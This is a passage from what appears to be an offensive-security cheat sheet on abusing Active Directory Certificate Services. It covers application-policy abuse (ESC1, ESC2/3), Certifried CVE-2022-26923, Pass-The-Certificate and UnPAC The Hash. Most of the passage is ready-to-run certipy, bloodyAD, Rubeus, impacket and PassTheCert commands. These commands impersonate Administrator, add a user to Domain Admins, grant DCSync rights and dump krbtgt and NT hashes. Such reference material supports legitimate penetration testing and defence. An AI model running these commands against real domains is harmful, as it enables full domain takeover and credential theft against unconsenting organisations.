<p>Detect the vulnerability from BloodHound data using the following cypher query.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="n">MATCH</span> <span class="n">p</span><span class="p">=(:</span><span class="n">Base</span><span class="p">)-[:</span><span class="n">MemberOf</span><span class="p">*</span><span class="n">0</span><span class="p">..]-&gt;()-[:</span><span class="n">Enroll</span><span class="p">|</span><span class="n">AllExtendedRights</span><span class="p">]-&gt;(</span><span class="n">ct</span><span class="p">:</span><span class="n">CertTemplate</span><span class="p">)-[:</span><span class="n">PublishedTo</span><span class="p">]-&gt;(:</span><span class="n">EnterpriseCA</span><span class="p">)-[:</span><span class="n">TrustedForNTAuth</span><span class="p">]-&gt;(:</span><span class="n">NTAuthStore</span><span class="p">)-[:</span><span class="n">NTAuthStoreFor</span><span class="p">]-&gt;(:</span><span class="n">Domain</span><span class="p">)</span> <span class="nb">WHERE </span><span class="n">ct</span><span class="p">.</span><span class="n">enrolleesuppliessubject</span> <span class="p">=</span> <span class="n">True</span> <span class="n">AND</span> <span class="n">ct</span><span class="p">.</span><span class="n">authenticationenabled</span> <span class="p">=</span> <span class="n">False</span> <span class="n">AND</span> <span class="n">ct</span><span class="p">.</span><span class="n">requiresmanagerapproval</span> <span class="p">=</span> <span class="n">False</span> <span class="n">AND</span> <span class="n">ct</span><span class="p">.</span><span class="n">schemaversion</span> <span class="p">=</span> <span class="n">1</span> <span class="k">RETURN</span> <span class="n">p</span>
</code></pre></div>
<p>The <strong>Application Policies</strong> extension is a proprietary certificate extension with the OID <code>1.3.6.1.4.1.311</code>, same as <strong>x509 EKUs</strong>. It was designed to allow users to specify additional use cases for certificates by utilizing the same OIDs as those in the Enhanced Key Usage extension.
If there is a conflict between an Application Policy and an EKU, then Microsoft prefers the proprietary Application Policy.</p>
<blockquote>
<p>"Application policy is Microsoft specific and is treated much like Extended Key Usage. If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored." - Microsoft</p>
</blockquote>
<p>When a user requests a certificate based on a schema version 1 template and includes an application policy, the policy is incorporated into the certificate. This allows users to specify arbitrary EKUs, bypassing the requirements for ESC2.</p>
<p><strong>ESC1</strong> - The WebServer template is enabled by default in ADCS, requires a user-supplied SAN and only has the <code>Server Authentication</code> EKU. Using <a href="https://github.com/ly4k/Certipy/pull/228">ly4k/Certipy PR #228</a>, we can add the <code>Client Authentication</code> EKU to <code>WebServer</code>. Anybody with the <code>Enroll</code> permission on this template can now compromise the domain.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="n">certipy</span> <span class="n">req</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-ca</span> <span class="n">CA</span> <span class="n">-target-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span> <span class="n">-u</span> <span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="n">-p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-template</span> <span class="n">WebServer</span> <span class="n">-upn</span> <span class="n">Administrator</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-application-policies</span> <span class="s1">&#39;Client Authentication&#39;</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="n">administrator</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-ldap-shell</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="c"># in LDAP shell</span>
<a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="n">add_user</span> <span class="n">pentest_user</span>
<a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="n">add_user_to_group</span> <span class="n">pentest_user</span> <span class="s2">&quot;Domain Admins&quot;</span>
</code></pre></div>
<p><strong>ESC2/ESC3</strong> - <strong>Certificate Request Agent</strong> (<code>1.3.6.1.4.1.311.20.2.1</code>),</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="n">certipy</span> <span class="n">-req</span> <span class="n">-u</span> <span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="n">-p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="p">-</span><span class="n">-application-policies</span> <span class="s2">&quot;1.3.6.1.4.1.311.20.2.1&quot;</span> <span class="n">-ca</span> <span class="s2">&quot;Lab Root CA&quot;</span> <span class="n">-template</span> <span class="n">WebServer</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-target-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span>
<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="n">certipy</span> <span class="n">-req</span> <span class="n">-u</span> <span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="n">-p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-on-behalf-of</span> <span class="n">DOMAIN</span><span class="p">\\</span><span class="n">Administrator</span> <span class="n">-Template</span> <span class="n">User</span> <span class="n">-ca</span> <span class="s2">&quot;Lab Root CA&quot;</span> <span class="n">-pfx</span> <span class="n">user</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-target-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span>
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="n">administrator</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
</code></pre></div>
<h2 id="certifried-cve-2022-26923">Certifried CVE-2022-26923</h2>
<blockquote>
<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.</p>
</blockquote>
<ul>
<li>Find <code>ms-DS-MachineAccountQuota</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">get</span> <span class="n">object</span> <span class="s1">&#39;DC=lab,DC=local&#39;</span> <span class="p">-</span><span class="n">-attr</span> <span class="n">ms-DS-MachineAccountQuota</span> 
</code></pre></div>
<ul>
<li>Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">add</span> <span class="n">computer</span> <span class="n">cve</span> <span class="s1">&#39;CVEPassword1234*&#39;</span>
<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">create</span> <span class="s1">&#39;lab.local/username:Password123*@dc.lab.local&#39;</span> <span class="n">-user</span> <span class="s1">&#39;cve&#39;</span> <span class="n">-dns</span> <span class="s1">&#39;dc.lab.local&#39;</span>
</code></pre></div>
<ul>
<li>[ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">tgtdeleg</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">ws02</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="s1">&#39;ws02$&#39;</span> <span class="n">-k</span> <span class="p">-</span><span class="n">-host</span> <span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="nb">set </span><span class="n">object</span> <span class="s1">&#39;CN=ws02,CN=Computers,DC=lab,DC=local&#39;</span> <span class="n">servicePrincipalName</span>
</code></pre></div>
<ul>
<li>Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="nb">set </span><span class="n">object</span> <span class="s1">&#39;CN=cve,CN=Computers,DC=lab,DC=local&#39;</span> <span class="n">dNSHostName</span> <span class="n">-v</span> <span class="n">DC</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="s1">&#39;Password123*&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">get</span> <span class="n">object</span> <span class="s1">&#39;CN=cve,CN=Computers,DC=lab,DC=local&#39;</span> <span class="p">-</span><span class="n">-attr</span> <span class="n">dNSHostName</span>
</code></pre></div>
<ul>
<li>Request a ticket</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c"># certipy req &#39;domain.local/cve$:CVEPassword1234*@ADCS_IP&#39; -template Machine -dc-ip DC_IP -ca discovered-CA</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;lab.local/cve$:CVEPassword1234*@10.100.10.13&#39;</span> <span class="n">-template</span> <span class="n">Machine</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-ca</span> <span class="n">lab-ADCS-CA</span>
</code></pre></div>
<ul>
<li>Either use the pfx or set a RBCD on your machine account to takeover the domain</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="p">./</span><span class="n">dc</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>
<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="n">-in</span> <span class="n">dc</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-out</span> <span class="n">dc</span><span class="p">.</span><span class="n">pem</span> <span class="n">-nodes</span>
<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="n">bloodyAD</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span>  <span class="n">-c</span> <span class="s2">&quot;:dc.pem&quot;</span> <span class="n">-u</span> <span class="s1">&#39;cve$&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">add</span> <span class="n">rbcd</span> <span class="s1">&#39;CRASHDC$&#39;</span> <span class="s1">&#39;CVE$&#39;</span>
<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">LDAP</span><span class="p">/</span><span class="n">CRASHDC</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="s1">&#39;lab.local/cve$:CVEPassword1234*&#39;</span>   
<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">-user-status</span> <span class="n">-just-dc-ntlm</span> <span class="n">-just-dc-user</span> <span class="n">krbtgt</span> <span class="s1">&#39;lab.local/Administrator@dc.lab.local&#39;</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-target-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> 
</code></pre></div>
<h2 id="pass-the-certificate">Pass-The-Certificate</h2>
<blockquote>
<p>Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"</p>
</blockquote>
<ul>
<li>Windows</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c"># Information about a cert file</span>
<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="n">certutil</span> <span class="n">-v</span> <span class="n">-dump</span> <span class="n">admin</span><span class="p">.</span><span class="n">pfx</span>
<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
<a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="c"># From a Base64 PFX</span>
<a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s2">&quot;TARGET_SAMNAME&quot;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="s2">&quot;FQDN_DOMAIN&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DOMAIN_CONTROLLER&quot;</span> <span class="p">/</span><span class="n">show</span>
<a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>
<a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="c"># Grant DCSync rights to an user</span>
<a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="p">./</span><span class="n">PassTheCert</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-server</span> <span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-cert-path</span> <span class="n">C</span><span class="p">:\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">-</span><span class="n">-elevate</span> <span class="p">-</span><span class="n">-target</span> <span class="s2">&quot;DC=domain,DC=local&quot;</span> <span class="p">-</span><span class="n">-sid</span> <span class="p">&lt;</span><span class="n">user_SID</span><span class="p">&gt;</span>
<a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="c"># To restore</span>
<a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="p">./</span><span class="n">PassTheCert</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-server</span> <span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-cert-path</span> <span class="n">C</span><span class="p">:\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">-</span><span class="n">-elevate</span> <span class="p">-</span><span class="n">-target</span> <span class="s2">&quot;DC=domain,DC=local&quot;</span> <span class="p">-</span><span class="n">-restore</span> <span class="n">restoration_file</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<ul>
<li>Linux</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="c"># Base64-encoded PFX certificate (string) (password can be set)</span>
<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-pfx-base64</span> <span class="p">$(</span><span class="nb">cat </span><span class="s2">&quot;PATH_TO_B64_PFX_CERT&quot;</span><span class="p">)</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="err">​</span>
<a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="c"># PEM certificate (file) + PEM private key (file)</span>
<a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-cert-pem</span> <span class="s2">&quot;PATH_TO_PEM_CERT&quot;</span> <span class="n">-key-pem</span> <span class="s2">&quot;PATH_TO_PEM_KEY&quot;</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a>
<a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="c"># PFX certificate (file) + password (string, optionnal)</span>
<a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-cert-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-pfx-pass</span> <span class="s2">&quot;CERT_PASSWORD&quot;</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a>
<a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a><span class="c"># Using Certipy</span>
<a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-dc-ip</span> <span class="s1">&#39;dc-ip&#39;</span> <span class="n">-username</span> <span class="s1">&#39;user&#39;</span> <span class="n">-domain</span> <span class="s1">&#39;domain&#39;</span>
<a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="n">certipy</span> <span class="n">cert</span> <span class="n">-export</span> <span class="n">-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-password</span> <span class="s2">&quot;CERT_PASSWORD&quot;</span> <span class="n">-out</span> <span class="s2">&quot;unprotected.pfx&quot;</span>
</code></pre></div>
<h3 id="pkinit-error">PKINIT ERROR</h3>
<p>When the DC does not support <strong>PKINIT</strong> (the pre-authentication allowing to retrieve either TGT or NT Hash using certificate). You will get an error like the following in the tool's output.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="p">$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="s2">&quot;PATH_TO_PFX_CERT&quot;</span> <span class="n">-dc-ip</span> <span class="s1">&#39;dc-ip&#39;</span> <span class="n">-username</span> <span class="s1">&#39;user&#39;</span> <span class="n">-domain</span> <span class="s1">&#39;domain&#39;</span>
<a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="p">[...]</span>
<a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="n">KDC_ERROR_CLIENT_NOT_TRUSTED</span> <span class="p">(</span><span class="n">Reserved</span> <span class="k">for</span> <span class="n">PKINIT</span><span class="p">)</span>
</code></pre></div>
<p>There is still a way to use the certificate to takeover the account.</p>
<ul>
<li>
<p>Open an LDAP shell using the certificate</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="n">target</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-debug</span> <span class="n">-username</span> <span class="n">username</span> <span class="n">-domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-dns-tcp</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-ldap-shell</span>
</code></pre></div>
</li>
<li>
<p>Add a computer for RBCD</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="n">impacket-addcomputer</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">User</span><span class="p">:</span><span class="n">P</span><span class="nv">@ssw0rd</span> <span class="n">-computer-name</span> <span class="s2">&quot;NEWCOMPUTER&quot;</span> <span class="n">-computer-pass</span> <span class="s2">&quot;P@ssw0rd123*&quot;</span>
</code></pre></div>
</li>
<li>
<p>Set the RBCD</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="n">set_rbcd</span> <span class="s1">&#39;TARGET$&#39;</span> <span class="s1">&#39;NEWCOMPUTER$&#39;</span>
</code></pre></div>
</li>
<li>
<p>Request a ticket with impersonation</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="n">impacket-getST</span> <span class="n">-spn</span> <span class="s1">&#39;cifs/target.domain.local&#39;</span> <span class="n">-impersonate</span> <span class="s1">&#39;target$&#39;</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="s1">&#39;DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*&#39;</span>
</code></pre></div>
</li>
<li>
<p>Use the ticket</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">DC</span><span class="p">$.</span><span class="n">ccache</span>
<a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="n">impacket-secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;target$&#39;</span><span class="nv">@target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-just-dc-user</span> <span class="s1">&#39;krbtgt&#39;</span>
</code></pre></div>
</li>
</ul>
<h2 id="unpac-the-hash">UnPAC The Hash</h2>
<p>Using the <strong>UnPAC The Hash</strong> method, you can retrieve the NT Hash for an User via its certificate.</p>
<ul>
<li>
<p>Windows</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c"># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.</span>
<a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">getcredentials</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s2">&quot;TARGET_SAMNAME&quot;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="s2">&quot;BASE64_CERTIFICATE&quot;</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="s2">&quot;FQDN_DOMAIN&quot;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="s2">&quot;DOMAIN_CONTROLLER&quot;</span> <span class="p">/</span><span class="n">show</span>
</code></pre></div>
</li>
<li>
<p>Linux</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="c"># Obtain a TGT by validating a PKINIT pre-authentication</span>
<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="p">$</span> <span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">-cert-pfx</span> <span class="s2">&quot;PATH_TO_CERTIFICATE&quot;</span> <span class="n">-pfx-pass</span> <span class="s2">&quot;CERTIFICATE_PASSWORD&quot;</span> <span class="s2">&quot;FQDN_DOMAIN/TARGET_SAMNAME&quot;</span> <span class="s2">&quot;TGT_CCACHE_FILE&quot;</span>
<a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
<a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="c"># Use the session key to recover the NT hash</span>
<a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="p">$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="s2">&quot;TGT_CCACHE_FILE&quot;</span> <span class="n">getnthash</span><span class="p">.</span><span class="n">py</span> <span class="n">-key</span> <span class="s1">&#39;AS-REP encryption key&#39;</span> <span class="s1">&#39;FQDN_DOMAIN&#39;</span><span class="p">/</span><span class="s1">&#39;TARGET_SAMNAME&#39;</span>
</code></pre></div>
</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/">Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</a></li>
<li><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf">Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</a></li>
<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned - Will Schroeder - Jun 17 2021</a></li>
<li><a href="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/">Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</a></li>
